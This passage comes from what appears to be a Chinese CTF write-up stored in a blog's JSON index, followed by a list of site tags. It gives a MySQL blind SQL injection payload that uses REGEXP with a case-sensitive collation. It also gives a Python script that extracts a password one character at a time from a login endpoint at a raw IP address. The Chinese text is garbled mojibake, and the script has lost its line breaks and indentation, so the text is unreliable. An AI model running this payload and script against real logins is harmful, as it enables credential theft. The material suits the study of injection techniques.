ä½†æ˜¯æ¥ä¸‹æ¥è¿˜éœ€è¦è§£å†³å¤§å°å†™é—®é¢˜ï¼ŒæŸ¥é˜…mysql8.0çš„æ–‡æ¡£ï¼Œå‘ç°regexpåœ¨æ¯”å¯¹çš„æ—¶å€™å¯ä»¥è®¾ç½®å­—ç¬¦é›†ç”¨æ¥è¡¨ç¤ºè§„åˆ™ï¼ˆä¹Ÿå°±æ˜¯å¯ä»¥æ¯”å¯¹å¤§å°å†™ï¼‰ä½†æ˜¯æˆ‘åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°è¦ä½¿ç”¨å¯¹åº”æ•°æ®åº“çš„ç¼–ç å½¢å¼æ‰å¯ä»¥ï¼Œçœ‹äº†ä¸€ä¸‹hintï¼Œå¯ä»¥å‘ç°è¿™ä¸ªæ•°æ®åº“æ˜¯ä½¿ç”¨è¿™ä¸ªç¼–ç è§„åˆ™çš„ COLLATE=utf8mb4_0900_as_cs æ‰€ä»¥æˆ‘ä»¬çš„payloadä¹Ÿå‘¼ä¹‹æ¬²å‡ºäº†,ä½¿ç”¨ '||case'1'when`username`regexp'a'COLLATEâ€˜utf8mb4_0900_as_csâ€™then'1'else~0+~0+'a'end||'a æ¥ä¸‹æ¥å°±æ˜¯å†™æˆè„šæœ¬äº† import requestsimport stringurl=&quot;http://110.42.133.120:8080/login&quot;s=requests.session()#a=string.printablea=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%&amp;'/:&lt;=&gt;@[]^_`{}~^!$&quot;print(a)print(a[-3:])str = &quot;&quot;#aeoofor j in range(0,100): for i in a: if i in a[-3:]: i=i.replace(i,f'\\\\\\\\{i}') payload=f&quot;a'||case'1'when`password`regexp'^{str+i}'COLLATE`utf8mb4_0900_as_cs`then'1'else~0+~0+'a'end||'a&quot; data={ &quot;username&quot;:payload, &quot;password&quot;:&quot;a&quot; } r=s.post(url,data=data).text print(r) print(payload) if &quot;401&quot; in r: if &quot;\\\\&quot; in i: i.replace(&quot;\\\\\\\\&quot;,&quot;&quot;) str+=i print(f&quot;[+]{str}&quot;) break","link":"/2022/03/19/%E8%99%8E%E7%AC%A6/"}],"tags":[{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","link":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"htmlåŸç†","slug":"htmlåŸç†","link":"/tags/html%E5%8E%9F%E7%90%86/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"bugku","slug":"bugku","link":"/tags/bugku/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"bugku2","slug":"bugku2","link":"/tags/bugku2/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"åå¼¹shell","slug":"åå¼¹shell","link":"/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"typro","slug":"typro","link":"/tags/typro/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"MYSQL","slug":"MYSQL","link":"/tags/MYSQL/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"sqlmap","slug":"sqlmap","link":"/tags/sqlmap/"},{"name":"xss","slug":"xss","link":"/tags/xss/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[],"pages":[]}